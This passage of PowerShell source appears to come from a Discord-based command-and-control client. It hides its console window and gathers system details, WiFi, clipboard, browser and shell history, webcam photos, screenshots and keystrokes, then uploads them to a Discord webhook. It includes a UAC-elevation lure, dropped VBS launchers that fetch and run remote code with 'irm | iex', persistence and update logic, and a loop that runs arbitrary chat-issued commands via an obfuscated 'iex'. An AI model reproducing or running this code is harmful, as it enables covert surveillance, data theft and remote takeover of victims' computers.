            $originalFileContent | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}
}

$infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"
$infomessage1 = "``````
=============================================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=============================================================
User Information
-------------------------------------------------------------
Current User          : $env:USERNAME
Email Address         : $email
Language              : $systemLanguage
Keyboard Layout       : $keyboardLayoutID
Other Accounts        : $users
Current OS            : $OSString
Build ID              : $ver
Architechture         : $OSArch
Screen Size           : $screensize
Location              : $GPS
=============================================================
Hardware Information
-------------------------------------------------------------
Processor             : $processor 
Memory                : $RamInfo
Gpu                   : $gpu

Storage
----------------------------------------
$Hddinfo
$DiskHealth
Current System Metrics
----------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio
=============================================================
Network Information
-------------------------------------------------------------
Public IP Address     : $computerPubIP
``````"
$infomessage2 = "

Saved WiFi Networks
----------------------------------------
$outssid

Nearby Wifi Networks
----------------------------------------
$Wifi
==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
----------------------------------------
$Value

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="
$outpath = "$env:TEMP/systeminfo.txt"
$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append

if ($OSString -like '*11*'){
    EnumNotepad
}
else{
    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
}

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
curl.exe -F file1=@"$outpath" $hookurl
Sleep 1
Remove-Item -Path $outpath -force
}

Function IsAdmin{
    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
    else{
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    }
}

Function AttemptElevate{
    $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
    $pth = "C:\Windows\Tasks\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    try{
        & $pth
        Sleep 7
        rm -Path $pth
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
        exit
    }
    catch{
    Write-Host "FAILED"
    }
}

Function TakePicture {
    $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
    if (-not (Test-Path $dllPath)) {
        $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $dllPath)
    }
    Add-Type -Path $dllPath
    [Webcam.webcam]::init()
    [Webcam.webcam]::select(1)
    $imageBytes = [Webcam.webcam]::GetImage()
    $tempDir = [System.IO.Path]::GetTempPath()
    $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
    [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
    sleep 1
    curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
    sleep 1
    Remove-Item -Path "$env:TEMP\webcam.dll"
    Remove-Item -Path $imagePath -Force
}

Function Screenshot {
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    
    $mkvPath = "$env:Temp\ScreenClip.jpg"
    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
    sleep 1
    rm -Path $mkvPath -Force

}

Function KeyCapture {
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Started`` :mag_right:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
    $KeypressThreshold = [TimeSpan]::FromSeconds(10)
    While ($true){
        $keyPressed = $false
        try{
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++){
            $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                $keyPressed = $true
                $LastKeypressTime.Restart()
                $null = [console]::CapsLock
                $vtkey = $API::MapVirtualKey($asc, 3)
                $kbst = New-Object Byte[] 256
                $checkkbst = $API::GetKeyboardState($kbst)
                $logchar = New-Object -TypeName System.Text.StringBuilder          
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                    $LString = $logchar.ToString()
                        if ($asc -eq 8) {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        $nosave += $LString 
                        }
                    }
                }
            }
            $messages = PullMsg
            if ($messages -match "kill") {
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            $previouscmd = $response
            $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
            $tobat | Out-File -FilePath $VBpath -Force
            sleep 1
            & $VBpath
            exit
            }
        }
        finally{
            $messages = PullMsg
            If (($keyPressed) -and (!($messages -match "kill"))) {
                $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                $keyPressed = $false
                $nosave = ""
            }
        }
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
    }
}

# =================================================================================
Function WaitingMsg {
$jsonPayload = @{
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Waiting to connect "
            "description" = @"
Enter **$env:COMPUTERNAME** In Chat To Start    
"@
            color       = 16711680
            author      = @{
                name     = "egieb"
                url      = "https://github.com/beigeworm"
                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
}

Function ConnectMsg {
$jsonPayload = @{
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | C2 session started!"
            "description" = @"
**Enter Commands In Chat**

Try : ``options`` for a list of commands
Try : ``extrainfo`` for command exapmples
Use : ``pause`` to pause the session on the target
Use : ``close`` to stop the session on the target
     
"@
            color       = 16711680
            author      = @{
                name     = "egieb"
                url      = "https://github.com/beigeworm"
                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
}

function PullMsg {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
    
    if ($response) {
        $most_recent_message = ($response | ConvertFrom-Json)[0]
        if (-not $most_recent_message.author.bot) {
            $response = $most_recent_message.content
            $script:response = $response
            $script:messages = $response
        }
    } else {
        Write-Output "No messages found in the channel."
    }
}

Function GetFfmpeg{
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
        $tempDir = "$env:temp"
        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
        $extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
    }
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Download Complete`` :white_check_mark:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}

Function VersionCheck {
    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
    $VBpath = "C:\Windows\Tasks\service.vbs"
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
    Write-Output "Persistance Installed - Checking Version.."
        if (!($version -match $versionCheck)){
            Write-Output "Newer version available! Downloading and Restarting"
            RemovePersistance
            AddPersistance
            $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
            $tobat | Out-File -FilePath $VBpath -Force
            sleep 1
            & $VBpath
            exit
        }
    }
}

Function Authenticate{

    if ($response -like "$env:COMPUTERNAME") {
        Write-Host "Authenticated $env:COMPUTERNAME"
        $script:authenticated = 1
        $script:previouscmd = $response
        ConnectMsg
    
    }
    else{
        Write-Host "$env:COMPUTERNAME Not authenticated"
        $script:authenticated = 0
        $script:previouscmd = $response
    } 
}

# =================================================================================

HideConsole
PullMsg
$previouscmd = $response
VersionCheck
WaitingMsg

while($true){

    PullMsg
    if (!($response -like "$previouscmd")) {

        Write-Output "Command found!"
        if($authenticated -eq 1){
            if ($response -like "close") {
                $previouscmd = $response        
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                break
            }
            if ($response -like "Pause") {
                $script:authenticated = 0
                $previouscmd = $response        
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":pause_button: ``Session Paused..`` :pause_button:"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                WaitingMsg
            }
            elseif (!($response -like "$previouscmd")) {
                $Result=ie`x($response) -ErrorAction Stop
                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")){
                    $script:previouscmd = $response
                }
                else{
                    $script:previouscmd = $response
                    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````$Result``````"} | ConvertTo-Json
                    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                }
            }
        }
        else{
            Authenticate
        }
    }
    sleep 5
}
